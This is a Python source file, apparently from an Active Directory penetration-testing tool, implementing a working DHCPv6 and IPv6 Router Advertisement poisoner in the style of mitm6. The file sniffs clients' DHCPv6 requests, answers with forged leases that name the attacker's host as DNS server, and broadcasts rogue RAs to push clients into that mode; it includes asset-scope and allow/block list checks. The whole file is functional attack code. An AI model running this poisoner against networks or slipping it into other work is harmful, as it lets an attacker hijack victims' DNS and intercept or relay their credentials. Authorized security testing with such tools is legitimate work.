"""Async DHCPv6 + Router Advertisement poisoner backed by scapy.

DHCPv6 (RFC 8415) and IPv6 RA (RFC 4861) are inherently L2 protocols:
clients send Solicit packets *before* having any IPv6 address, so
replies must include a crafted Ethernet/IPv6 frame with our MAC and
link-local address.  asysocks operates at L4 only, so we use scapy as
the wire-level engine — the only realistic option (mitm6 made the same
choice for the same reason).

Threading model
---------------
scapy's ``AsyncSniffer`` runs the packet pump in its own daemon thread.
Sniffed packets are dispatched synchronously to ``_handle_packet`` from
that thread; ``_handle_packet`` builds and sends the reply via
``sendp`` (scapy thread-safe socket).  Observations are queued onto the
asyncio loop with ``run_coroutine_threadsafe`` so callers stay in
asyncio land.

Public surface
--------------
* ``DHCPv6Poisoner.start()`` / ``stop()`` — async lifecycle.
* ``send_router_advertisement_loop()`` — coroutine that periodically
  emits RA so clients drop into stateful DHCPv6 mode.

The orchestrator in ``orchestrator.py`` composes the poisoner with the
DNS hijacker; this file does not touch DNS.
"""

from __future__ import annotations

import asyncio
import contextlib
import struct
import time
from typing import Any

from adscan_internal.rich_output import print_info_debug
from adscan_internal.services.mitm6.core import (
    victim_fqdn_in_asset_scope,
    DHCPv6Observation,
    MITM6Callback,
    MITM6Config,
    matches_filter,
)


# ---------------------------------------------------------------------------
# DUID generation (RFC 8415 §11.2 — DUID-LLT)
# ---------------------------------------------------------------------------

_DUID_LLT_TYPE = 1
_HW_TYPE_ETHERNET = 1
# Seconds between 2000-01-01 00:00 UTC and the Unix epoch.
_DUID_LLT_EPOCH_OFFSET = 946684800


def _build_server_duid(mac: str) -> bytes:
    """Build a stable DUID-LLT for the server identifier option."""

    raw_mac = bytes(int(part, 16) for part in mac.split(":"))
    timestamp = int(time.time()) - _DUID_LLT_EPOCH_OFFSET
    return (
        struct.pack(">HHI", _DUID_LLT_TYPE, _HW_TYPE_ETHERNET, timestamp)
        + raw_mac
    )


# ---------------------------------------------------------------------------
# Address allocation (RFC 8415 §15: leases need a unique IA address)
# ---------------------------------------------------------------------------

class _IPv6Allocator:
    """Mint stable per-victim IPv6 addresses inside ``ipv6_prefix``.

    Real DHCPv6 servers maintain a lease database; we just need every
    victim to get an address that decodes its IPv4 (when known) so logs
    are human-readable.  Falls back to a counter when no IPv4 is known.
    """

    def __init__(self, prefix: str) -> None:
        self._prefix = prefix.rstrip(":") + ":"
        self._counter = 1

    def allocate(self, victim_ipv4: str | None) -> str:
        if victim_ipv4:
            # 192.168.1.5 → 192:168:1:5 (informational, not routable)
            return f"{self._prefix}{victim_ipv4.replace('.', ':')}"
        addr = f"{self._prefix}feed:{self._counter:x}"
        self._counter += 1
        return addr


# ---------------------------------------------------------------------------
# Poisoner
# ---------------------------------------------------------------------------

class DHCPv6Poisoner:
    """Listens for DHCPv6 + replies with us as the DNS server.

    The class encapsulates the scapy machinery so callers never import
    scapy directly.  Failure to import scapy at ``start()`` raises a
    descriptive ``RuntimeError`` instead of crashing on attribute access.
    """

    def __init__(
        self,
        config: MITM6Config,
        observation_callback: MITM6Callback = None,
    ) -> None:
        self._config = config
        self._observation_callback = observation_callback
        self._sniffer: Any = None
        self._loop: asyncio.AbstractEventLoop | None = None
        self._our_duid: bytes | None = None
        self._allocator = _IPv6Allocator(config.ipv6_prefix)
        # Cache of victim MAC → seen FQDN, mirrors mitm6's pcdict.
        self._victim_fqdns: dict[str, str] = {}

    # -- lifecycle --------------------------------------------------------

    async def start(self) -> None:
        """Start the AsyncSniffer; raise on missing scapy/iface/mac."""

        self._loop = asyncio.get_event_loop()
        self._our_duid = _build_server_duid(self._require_mac())
        scapy_modules = self._import_scapy()

        sniffer_cls = scapy_modules["AsyncSniffer"]
        self._sniffer = sniffer_cls(
            iface=self._config.interface_name,
            filter="ip6 and udp and (port 547 or port 546)",
            prn=self._handle_packet,
            store=False,
        )
        try:
            self._sniffer.start()
        except Exception as exc:  # noqa: BLE001
            raise RuntimeError(
                f"DHCPv6Poisoner failed to start sniffer on "
                f"{self._config.interface_name}: {exc}"
            ) from exc
        print_info_debug(
            f"[mitm6-dhcpv6] sniffer up on {self._config.interface_name}"
        )

    async def stop(self) -> None:
        """Stop the sniffer (best-effort; never raises)."""

        if self._sniffer is None:
            return
        with contextlib.suppress(Exception):
            self._sniffer.stop()
        self._sniffer = None

    # -- scapy import (lazy to keep core imports cheap) -------------------

    @staticmethod
    def _import_scapy() -> dict[str, Any]:
        try:
            from scapy.layers.dhcp6 import (  # noqa: PLC0415
                DHCP6_Advertise,
                DHCP6_Renew,
                DHCP6_Reply,
                DHCP6_Request,
                DHCP6_Solicit,
                DHCP6OptClientFQDN,
                DHCP6OptClientId,
                DHCP6OptDNSDomains,
                DHCP6OptDNSServers,
                DHCP6OptIA_NA,
                DHCP6OptIAAddress,
                DHCP6OptServerId,
            )
            from scapy.layers.inet6 import ICMPv6ND_RA, IPv6  # noqa: PLC0415
            from scapy.layers.l2 import Ether  # noqa: PLC0415
            from scapy.layers.inet import UDP  # noqa: PLC0415
            from scapy.sendrecv import AsyncSniffer, sendp  # noqa: PLC0415
        except ImportError as exc:
            raise RuntimeError(
                "MITM6 requires scapy — install with `pip install scapy>=2.5.0`"
            ) from exc
        return {
            "AsyncSniffer": AsyncSniffer,
            "DHCP6_Advertise": DHCP6_Advertise,
            "DHCP6_Renew": DHCP6_Renew,
            "DHCP6_Reply": DHCP6_Reply,
            "DHCP6_Request": DHCP6_Request,
            "DHCP6_Solicit": DHCP6_Solicit,
            "DHCP6OptClientFQDN": DHCP6OptClientFQDN,
            "DHCP6OptClientId": DHCP6OptClientId,
            "DHCP6OptDNSDomains": DHCP6OptDNSDomains,
            "DHCP6OptDNSServers": DHCP6OptDNSServers,
            "DHCP6OptIA_NA": DHCP6OptIA_NA,
            "DHCP6OptIAAddress": DHCP6OptIAAddress,
            "DHCP6OptServerId": DHCP6OptServerId,
            "Ether": Ether,
            "ICMPv6ND_RA": ICMPv6ND_RA,
            "IPv6": IPv6,
            "UDP": UDP,
            "sendp": sendp,
        }

    # -- packet handling --------------------------------------------------

    def _handle_packet(self, packet) -> None:
        """Dispatch one inbound DHCPv6 packet (called from scapy thread)."""

        modules = self._import_scapy()
        try:
            if modules["DHCP6_Solicit"] in packet:
                self._handle_solicit(packet, modules)
            elif modules["DHCP6_Request"] in packet:
                self._handle_request_or_renew(
                    packet, modules, kind="reply", inner_layer="DHCP6_Request"
                )
            elif modules["DHCP6_Renew"] in packet:
                self._handle_request_or_renew(
                    packet, modules, kind="renew_reply", inner_layer="DHCP6_Renew"
                )
        except Exception as exc:  # noqa: BLE001
            print_info_debug(f"[mitm6-dhcpv6] handler error: {exc}")

    def _handle_solicit(self, packet, modules) -> None:
        fqdn = self._extract_fqdn(packet, modules)
        victim_mac = packet.src
        if not self._should_attack(fqdn):
            return
        self._victim_fqdns[victim_mac] = fqdn
        assigned = self._allocator.allocate(self._victim_ipv4(packet))
        reply = self._build_advertise(packet, modules, assigned)
        self._send(reply, modules)
        self._emit(
            DHCPv6Observation(
                kind="advertise",
                victim_mac=victim_mac,
                victim_fqdn=fqdn,
                assigned_ipv6=assigned,
            )
        )

    def _handle_request_or_renew(
        self, packet, modules, *, kind: str, inner_layer: str
    ) -> None:
        # Only reply when the victim is renewing/confirming OUR lease — i.e. the
        # ServerId option carries our DUID.  Otherwise a real DHCPv6 server
        # owns this exchange and we must stay silent.
        server_id_opt = modules["DHCP6OptServerId"]
        if server_id_opt not in packet:
            return
        if packet[server_id_opt].duid != self._our_duid:
            return

        fqdn = self._victim_fqdns.get(packet.src) or self._extract_fqdn(packet, modules)
        if not self._should_attack(fqdn):
            return

        try:
            ia_addr = packet[modules["DHCP6OptIAAddress"]]
            assigned = ia_addr.addr
        except IndexError:
            return  # some clients omit the IAAddress option in Renew

        reply = self._build_reply(packet, modules, inner_layer, assigned)
        self._send(reply, modules)
        self._emit(
            DHCPv6Observation(
                kind=kind,
                victim_mac=packet.src,
                victim_fqdn=fqdn,
                assigned_ipv6=assigned,
            )
        )

    # -- packet construction ---------------------------------------------

    def _base_l2_response(self, packet, modules):
        return (
            modules["Ether"](dst=packet.src, src=self._require_mac())
            / modules["IPv6"](
                src=self._require_ipv6_linklocal(),
                dst=packet["IPv6"].src,
            )
            / modules["UDP"](sport=547, dport=546)
        )

    def _build_advertise(self, packet, modules, assigned: str):
        solicit = packet[modules["DHCP6_Solicit"]]
        resp = self._base_l2_response(packet, modules)
        resp /= modules["DHCP6_Advertise"](trid=solicit.trid)
        resp /= modules["DHCP6OptClientId"](
            duid=packet[modules["DHCP6OptClientId"]].duid
        )
        resp /= modules["DHCP6OptServerId"](duid=self._our_duid)
        resp /= modules["DHCP6OptDNSServers"](
            dnsservers=[self._require_ipv6_linklocal()]
        )
        if self._config.local_domain:
            resp /= modules["DHCP6OptDNSDomains"](
                dnsdomains=[self._config.local_domain]
            )
        opt = modules["DHCP6OptIAAddress"](
            preflft=300, validlft=300, addr=assigned
        )
        resp /= modules["DHCP6OptIA_NA"](
            ianaopts=[opt],
            T1=200,
            T2=250,
            iaid=packet[modules["DHCP6OptIA_NA"]].iaid,
        )
        return resp

    def _build_reply(self, packet, modules, inner_layer_name: str, assigned: str):
        inner = packet[modules[inner_layer_name]]
        resp = self._base_l2_response(packet, modules)
        resp /= modules["DHCP6_Reply"](trid=inner.trid)
        resp /= modules["DHCP6OptClientId"](
            duid=packet[modules["DHCP6OptClientId"]].duid
        )
        resp /= modules["DHCP6OptServerId"](duid=self._our_duid)
        resp /= modules["DHCP6OptDNSServers"](
            dnsservers=[self._require_ipv6_linklocal()]
        )
        if self._config.local_domain:
            resp /= modules["DHCP6OptDNSDomains"](
                dnsdomains=[self._config.local_domain]
            )
        opt = modules["DHCP6OptIAAddress"](
            preflft=300, validlft=300, addr=assigned
        )
        resp /= modules["DHCP6OptIA_NA"](
            ianaopts=[opt],
            T1=200,
            T2=250,
            iaid=packet[modules["DHCP6OptIA_NA"]].iaid,
        )
        return resp

    # -- introspection ---------------------------------------------------

    @staticmethod
    def _extract_fqdn(packet, modules) -> str:
        fqdn_opt = modules["DHCP6OptClientFQDN"]
        if fqdn_opt not in packet:
            return ""
        fqdn = packet[fqdn_opt].fqdn or ""
        return fqdn.rstrip(".")

    def _should_attack(self, fqdn: str) -> bool:
        if not fqdn and self._config.ignore_no_fqdn:
            return False
        if not victim_fqdn_in_asset_scope(fqdn or ""):
            return False
        return matches_filter(
            fqdn or "",
            allowlist=self._config.host_allowlist,
            blocklist=self._config.host_blocklist,
        )

    def _victim_ipv4(self, packet) -> str | None:  # noqa: ARG002
        # mitm6 looks up an ARP cache here; we keep the field optional.
        # The allocator falls back to a counter when this returns None.
        return None

    # -- requirements -----------------------------------------------------

    def _require_mac(self) -> str:
        if self._config.our_mac is None:
            raise RuntimeError(
                "MITM6 needs an explicit MAC; populate MITM6Config.our_mac "
                "before starting the suite."
            )
        return self._config.our_mac

    def _require_ipv6_linklocal(self) -> str:
        if self._config.our_ipv6_linklocal is None:
            raise RuntimeError(
                "MITM6 needs an IPv6 link-local; populate "
                "MITM6Config.our_ipv6_linklocal before starting the suite."
            )
        return self._config.our_ipv6_linklocal

    # -- transport + bridge ----------------------------------------------

    def _send(self, packet, modules) -> None:
        modules["sendp"](packet, iface=self._config.interface_name, verbose=False)

    def _emit(self, observation: DHCPv6Observation) -> None:
        cb = self._observation_callback
        loop = self._loop
        if cb is None or loop is None:
            return
        with contextlib.suppress(Exception):
            asyncio.run_coroutine_threadsafe(cb(observation), loop)


# ---------------------------------------------------------------------------
# Router Advertisement loop
# ---------------------------------------------------------------------------

async def send_router_advertisement_loop(
    config: MITM6Config,
    *,
    stop_event: asyncio.Event,
) -> None:
    """Periodically emit RA so clients fall into DHCPv6-stateful mode.

    The RA carries M=1, O=1 (Managed + Other config) and routerlifetime=0
    so we don't advertise ourselves as a default gateway (RFC 4861 §4.2).
    """

    modules = DHCPv6Poisoner._import_scapy()
    interval = max(config.router_advertisement_interval_seconds, 5.0)
    while not stop_event.is_set():
        ra = (
            modules["Ether"](
                src=config.our_mac, dst="33:33:00:00:00:01"
            )
            / modules["IPv6"](src=config.our_ipv6_linklocal, dst="ff02::1")
            / modules["ICMPv6ND_RA"](M=1, O=1, routerlifetime=0)
        )
        try:
            modules["sendp"](
                ra, iface=config.interface_name, verbose=False
            )
        except Exception as exc:  # noqa: BLE001
            print_info_debug(f"[mitm6-ra] send failed: {exc}")
        try:
            await asyncio.wait_for(stop_event.wait(), timeout=interval)
        except asyncio.TimeoutError:
            continue


__all__ = [
    "DHCPv6Poisoner",
    "send_router_advertisement_loop",
]
